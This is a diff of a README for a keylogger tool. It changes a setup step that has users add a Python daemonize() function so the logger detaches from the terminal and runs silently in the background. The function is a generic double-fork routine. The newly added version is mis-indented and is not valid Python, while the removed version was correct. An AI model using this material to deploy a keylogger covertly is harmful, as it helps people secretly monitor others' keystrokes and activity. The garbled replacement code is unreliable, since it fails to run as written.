@@ -113,37 +113,37 @@ Kiroku Keylogger is a sophisticated tool designed to capture and monitor a wide 
   1. Add this function:
      ```python
      def daemonize():
-      """Detach the process from the terminal and run it in the background."""
-      try:
-          # Fork the first child process
-          pid = os.fork()
-          if pid > 0:
-              # Exit the parent process
-              sys.exit(0)
-      except OSError as e:
-          print(f"Fork #1 failed: {e}")
-          sys.exit(1)
-      # Decouple from parent environment
-      os.chdir("/")
-      os.setsid()
-      os.umask(0)
-      # Fork the second child process
-      try:
-          pid = os.fork()
-          if pid > 0:
-              # Exit the second parent process
-              sys.exit(0)
-      except OSError as e:
-          print(f"Fork #2 failed: {e}")
-          sys.exit(1)
-      # Redirect standard file descriptors
-      sys.stdout.flush()
-      sys.stderr.flush()
-      with open("/dev/null", 'r') as null_file:
-          os.dup2(null_file.fileno(), sys.stdin.fileno())
-      with open("/dev/null", 'a+') as null_file:
-          os.dup2(null_file.fileno(), sys.stdout.fileno())
-          os.dup2(null_file.fileno(), sys.stderr.fileno())
+         """Detach the process from the terminal and run it in the background."""
+         try:
+         # Fork the first child process
+             pid = os.fork()
+                 if pid > 0:
+                 # Exit the parent process
+                 sys.exit(0)
+         except OSError as e:
+             print(f"Fork #1 failed: {e}")
+             sys.exit(1)
+         # Decouple from parent environment
+         os.chdir("/")
+         os.setsid()
+         os.umask(0)
+         # Fork the second child process
+         try:
+             pid = os.fork()
+             if pid > 0:
+                 # Exit the second parent process
+                 sys.exit(0)
+         except OSError as e:
+             print(f"Fork #2 failed: {e}")
+             sys.exit(1)
+         # Redirect standard file descriptors
+         sys.stdout.flush()
+         sys.stderr.flush()
+         with open("/dev/null", 'r') as null_file:
+             os.dup2(null_file.fileno(), sys.stdin.fileno())
+         with open("/dev/null", 'a+') as null_file:
+             os.dup2(null_file.fileno(), sys.stdout.fileno())
+             os.dup2(null_file.fileno(), sys.stderr.fileno())
      ```
 ## Warning
 
